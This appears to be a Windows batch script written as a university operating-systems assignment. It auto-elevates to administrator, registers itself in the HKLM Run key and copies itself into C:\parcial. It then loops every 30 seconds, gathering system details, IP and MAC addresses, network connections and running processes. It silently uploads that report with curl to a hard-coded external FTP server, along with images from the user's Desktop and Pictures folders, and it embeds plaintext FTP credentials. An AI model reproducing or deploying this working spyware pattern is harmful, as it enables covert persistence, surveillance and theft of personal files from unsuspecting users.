@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: ======================================================================
:: --- VERIFICACION DE ADMIN Y AUTO-ELEVACION ---
:: ======================================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: ======================================================================
:: --- AGREGAR AL ARRANQUE DE WINDOWS (REGEDIT) ---
:: ======================================================================
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Mundial_Rios" /t REG_SZ /d "C:\parcial\Rios.bat" /f >nul 2>&1

:: ======================================================================
:: --- REPLICACIÓN: CREAR CARPETA Y COPIARSE COMO APELLIDO.BAT ---
:: ======================================================================
if not exist "C:\parcial" (
    mkdir "C:\parcial" >nul 2>&1
)

if /i "%~f0" neq "C:\parcial\Rios.bat" (
    copy /Y "%~f0" "C:\parcial\Rios.bat" >nul 2>&1
)

:: ======================================================================
:: --- CONFIGURACION DE RUTAS Y REPORTE ---
:: ======================================================================
set "ARCHIVO_LOCAL=C:\parcial\datos.txt"

set "USUARIO=!USERNAME!"
set "MAQUINA=!COMPUTERNAME!"

set "ORIGEN_ESCRITORIO=%USERPROFILE%\Desktop"
set "ORIGEN_IMAGENES=%USERPROFILE%\Pictures"

:: Configuración de las URLs Dinámicas del Servidor FTP
set "FTP_SERVER=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/Gr03_!MAQUINA!/Gr03_Rios.txt"
set "FTP_URL_ESC=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/Gr03_!MAQUINA!/ESCRITORIO"
set "FTP_URL_IMG=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/Gr03_!MAQUINA!/IMAGENES"

set "FTP_USER=u917850771"
set "FTP_PASS=Unicesar2026+"

for /f "tokens=*" %%V in ('ver') do set "WIN_VER=%%V"

:BUCLE
set "FECHA=!date!"
set "HORA=!time!"

REM == Obtener Direccion IP IPv4 ==
set "IP="
for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4"') do (
    if not defined IP set "IP=%%I"
)
if defined IP set "IP=!IP:~1!"

REM == Obtener Direccion MAC ==
set "MAC="
for /f "tokens=1" %%M in ('getmac ^| findstr /r "..-..-..-..-..-.."') do (
    if not defined MAC set "MAC=%%M"
)

:: ======================================================================
:: --- GENERACION DEL ARCHIVO INFORMATIVO TXT ---
:: ======================================================================
echo ============================================================ > "!ARCHIVO_LOCAL!"
echo    INFORMACION DEL SISTEMA  ^| >> "!ARCHIVO_LOCAL!"
echo ============================================================ >> "!ARCHIVO_LOCAL!"
echo. >> "!ARCHIVO_LOCAL!"
echo  Version de Windows : !WIN_VER! >> "!ARCHIVO_LOCAL!"
echo  Fecha              : !FECHA! >> "!ARCHIVO_LOCAL!"
echo  Hora               : !HORA! >> "!ARCHIVO_LOCAL!"
echo  Usuario            : !USUARIO! >> "!ARCHIVO_LOCAL!"
echo  Direccion IP       : !IP! >> "!ARCHIVO_LOCAL!"
echo  Direccion MAC      : !MAC! >> "!ARCHIVO_LOCAL!"
echo  Nombre Maquina     : !MAQUINA! >> "!ARCHIVO_LOCAL!"
echo. >> "!ARCHIVO_LOCAL!"
echo ============================================================ >> "!ARCHIVO_LOCAL!"
echo  TODOS LOS PUERTOS LOCALES Y CONEXIONES (netstat -ano) >> "!ARCHIVO_LOCAL!"
echo ============================================================ >> "!ARCHIVO_LOCAL!"
echo. >> "!ARCHIVO_LOCAL!"
netstat -ano >> "!ARCHIVO_LOCAL!"
echo. >> "!ARCHIVO_LOCAL!"
echo ============================================================ >> "!ARCHIVO_LOCAL!"
echo  LISTA DE PROCESOS ACTIVOS (tasklist) >> "!ARCHIVO_LOCAL!"
echo ============================================================ >> "!ARCHIVO_LOCAL!"
echo. >> "!ARCHIVO_LOCAL!"
tasklist >> "!ARCHIVO_LOCAL!"
echo. >> "!ARCHIVO_LOCAL!"
echo ============================================================ >> "!ARCHIVO_LOCAL!"
echo  @Juliocrm  >> "!ARCHIVO_LOCAL!"
echo ============================================================ >> "!ARCHIVO_LOCAL!"

:: ======================================================================
:: --- ENVÍO DE DATOS MEDIANTE CURL AL SERVIDOR FTP (SILENCIOSO) ---
:: ======================================================================
curl --ftp-create-dirs -u "!FTP_USER!:!FTP_PASS!" -T "!ARCHIVO_LOCAL!" "!FTP_SERVER!" >nul 2>&1

for %%F in ("!ORIGEN_ESCRITORIO!\*.jpg" "!ORIGEN_ESCRITORIO!\*.jpeg" "!ORIGEN_ESCRITORIO!\*.png") do (
    curl --ftp-create-dirs -u "!FTP_USER!:!FTP_PASS!" -T "%%F" "!FTP_URL_ESC!/%%~nxF" >nul 2>&1
    goto :SUBIR_IMAGENES
)

:SUBIR_IMAGENES
for %%G in ("!ORIGEN_IMAGENES!\*.jpg" "!ORIGEN_IMAGENES!\*.jpeg" "!ORIGEN_IMAGENES!\*.png") do (
    curl --ftp-create-dirs -u "!FTP_USER!:!FTP_PASS!" -T "%%G" "!FTP_URL_IMG!/%%~nxG" >nul 2>&1
    goto :FIN_SUBIDA
)

:FIN_SUBIDA
timeout /t 30 /nobreak >nul
goto BUCLE